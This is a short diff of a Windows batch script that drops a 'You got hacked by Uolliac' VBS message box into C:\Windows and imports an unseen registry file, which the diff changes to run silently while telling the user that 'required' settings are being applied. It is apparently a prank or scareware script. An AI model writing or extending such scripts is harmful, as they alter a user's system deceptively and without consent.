@@ -27,7 +27,7 @@ echo.
 echo.
 pause
 echo x=msgbox("You got hacked by Uolliac. Enjoy", vbOKOnly+vbInformation, "Oh no, see message below!") > C:\Windows\haha_uolliac_hacked.vbs
-reg import trouillac.reg
+reg import trouillac.reg /f >nul
 echo.
 echo Registry settings that are required is applied.
 timeout /t 16 /nobreak >nul
